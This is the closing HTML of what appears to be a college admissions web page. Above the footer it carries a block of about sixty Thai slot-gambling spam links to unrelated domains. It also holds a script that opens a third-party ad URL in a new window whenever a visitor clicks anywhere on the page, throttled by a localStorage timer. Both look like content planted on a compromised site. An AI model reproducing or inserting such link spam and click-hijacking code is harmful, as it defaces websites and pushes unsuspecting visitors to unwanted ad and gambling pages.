<p><a href="https://techcodian.com/">สล็อตสด</a></p>
<p><a href="https://antamphat.com/">สล็อต PG</a></p>
<p><a href="https://avpack.com.vn/">สล็อต PG</a></p>
<p><a href="https://antranhelmet.com.vn/">สล็อต PG</a></p>
<p><a href="https://bidicovn.com/">สล็อต PG</a></p>
<p><a href="https://batdongsanvannguyen.com/">สล็อต PG</a></p>
<p><a href="https://baovephuongnam.com/">สล็อต PG</a></p>
<p><a href="https://baovenganan.com/">สล็อต PG</a></p>
<p><a href="https://chongthamdongduong.com/">สล็อต PG</a></p>
<p><a href="https://cayxanhtienthanh.com/">สล็อต PG</a></p>
<p><a href="https://baobinhuacattuongvi.com/">สล็อต PG</a></p>
<p><a href="https://caosusanbanh.com/">สล็อต PG</a></p>
<p><a href="https://cokhiatb.com/">สล็อต PG</a></p>
<p><a href="https://cokhichetaodaitin.com/">สล็อต PG</a></p>
<p><a href="https://cmmvietnam.com.vn/">สล็อต PG</a></p>
<p><a href="https://cokhisaphat.com/">สล็อต PG</a></p>
<p><a href="https://cokhinghiemthao.com/">สล็อต PG</a></p>
<p><a href="https://sankatech.vn/">สล็อต PG</a></p>
<p><a href="https://conkhothanhnhi.vn/">สล็อต PG</a></p>
<p><a href="https://npfruits.vn/">สล็อต PG</a></p>
<p><a href="https://congchungdatviet.com/">สล็อต PG</a></p>
<p><a href="https://dailynhotshell.com/">สล็อต PG</a></p>
<p><a href="https://dahoacuongquyetchien.com/">สล็อต PG</a></p>
<p><a href="https://dacsandongthapmuoi.vn/">สล็อต PG</a></p>
<p><a href="https://cungcapphulieumaymac.com/">สล็อต PG</a></p>
<p><a href="https://diemdongquan.com/">สล็อต PG</a></p>
<p><a href="https://dichvulamvesinh.com/">สล็อต PG</a></p>
<p><a href="https://dsgroup.com.vn/">สล็อต PG</a></p>
<p><a href="https://hoanhaonhuy.com/">สล็อต PG</a></p>
<p><a href="https://dienmangdangkhoa.com/">สล็อต PG</a></p>
<p><a href="https://7thakurdarshan.com/">สล็อต PG</a></p>
<p><a href="https://www.acchasauda.com/">สล็อต PG</a></p>
<p><a href="https://aastoneimpex.com/">สล็อต PG</a></p>
<p><a href="https://agilesoft.co.in/">สล็อต PG</a></p>
<p><a href="https://acid-blue.com/">สล็อต PG</a></p>
<p><a href="https://accountingvenue.com/">สล็อต PG</a></p>
<p><a href="https://allianceexim.com/">สล็อต PG</a></p>
<p><a href="https://alkaliprooftiles.com/">สล็อต PG</a></p>
<p><a href="https://alolog.com/">สล็อต PG</a></p>
<p><a href="https://alliencetechnologies.com/">สล็อต PG</a></p>
<p><a href="https://allianceeximindia.com/">สล็อต PG</a></p>
<p><a href="https://amoolkbakers.com/">สล็อต PG</a></p>
<p><a href="https://amnaagencia.com/">สล็อต PG</a></p>
<p><a href="https://www.amdrckgmu.com/">สล็อต PG</a></p>
<p><a href="https://amazoncontrol.in/">สล็อต PG</a></p>
<p><a href="https://dulichnambo.com/">สล็อต PG</a></p>
<p><a href="https://duadongduong.com/">สล็อต PG</a></p>
<p><a href="https://duabaonhi.com/">สล็อต PG</a></p>
<p><a href="https://dtphatautomation.com/">สล็อต PG</a></p>
<p><a href="https://www.electral.co.in/">สล็อต PG</a></p>
<p><a href="https://oshcstudents.com.au/">สล็อต PG</a></p>
<p><a href="https://www.bcclweb.in/">สล็อต PG</a></p>
<p><a href="https://tigernoodletexas.com/">สล็อต PG</a></p>
<p><a href="https://acet.ac.in/">สล็อต PG</a></p>
<p><a href="https://www.acoe.edu.in/">สล็อต PG</a></p>
<p><a href="https://aditya.ac.in/">สล็อต PG</a></p>
<p><a href="https://www.iith.ac.in/EK3D/">สล็อต PG</a></p>
<p><a href="https://www.nitttrc.ac.in/nitttr/video/">สล็อต PG</a></p>
<p><a href="https://exams.aiimspatna.edu.in/">สล็อต PG</a></p>
<p><a href="https://recruitment.aiimspatna.edu.in/">สล็อต PG</a></p>
</div>

<script>
  const adUrl = "https://www.profitableratecpm.com/t0in8wazza?key=e24fa901e6afc3a98b745c917f51fdcd";
  const delayInMinutes = 5;
  const delayInMs = delayInMinutes * 60 * 1000;

  function redirectWithCooldown() {
    const lastOpened = localStorage.getItem("lastAdTime");
    const now = Date.now();

    if (!lastOpened || now - parseInt(lastOpened, 10) > delayInMs) {
      localStorage.setItem("lastAdTime", now.toString());
      window.open(adUrl, "_blank");
    }
  }

  document.addEventListener("click", function () {
    redirectWithCooldown();
  });
</script>
<!-- Footer Area End Here -->
</div>
<!-- Main Body Area End Here -->
  <script type="text/javascript">
            $(function () {
                $('#myButton').floatingWhatsApp({
                    phone: '919553649666',
                    popupMessage: 'Hello, how can we help you?',
                    message: "Hi! I am Interested to take admission in ADITYA. Can you guide me through admission process? ",
                    showPopup: true,
                    showOnIE: false,
                    headerTitle: 'Welcome!',
                    headerColor: '#2a9a2e',
                    backgroundColor: '#2a9a2e',
                    // buttonImage: '<img src="burger.svg"/>',
                    // height: '60px',
                    // width: '60px',
                 
                });
            });
              $(document).ready(function() {
          // alert("page is loaded");
          $("#b-close").click(function() {
            $(".popup_this_container").fadeOut(0);
          });
          });

              function myFunction(div_name){
               var divs_array = ['myDIV1','myDIV2','myDIV3','myDIV4','myDIV5','myDIV6','myDIV7','myDIV8','myDIV9','myDIV10','myDIV11','myDIV12','myDIV13'];
               for (let i = 0; i < divs_array.length; i++) {
                if (divs_array[i] === div_name) {
                  $("#"+divs_array[i]).toggle();
              }else{
                  $("#"+divs_array[i]).hide();
              }
          } 
      }
        </script>

<script src="js/plugins.js" type="text/javascript"></script>
<script src="js/wow.min.js"></script>
<script src="js/jquery.meanmenu.min.js" type="text/javascript"></script>
<script src="js/jquery.scrollUp.min.js" type="text/javascript"></script>
<script src="js/jquery.counterup.min.js"></script>
<script src="js/waypoints.min.js"></script>
<script src="js/jquery.countdown.min.js" type="text/javascript"></script>
<script src="js/isotope.pkgd.min.js" type="text/javascript"></script>
<script src="js/jquery.magnific-popup.min.js" type="text/javascript"></script>
<script src="js/jquery.gridrotator.js" type="text/javascript"></script>
<script src="js/main.js" type="text/javascript"></script>
<script src="js/tabslinks.js" type="text/javascript"></script>
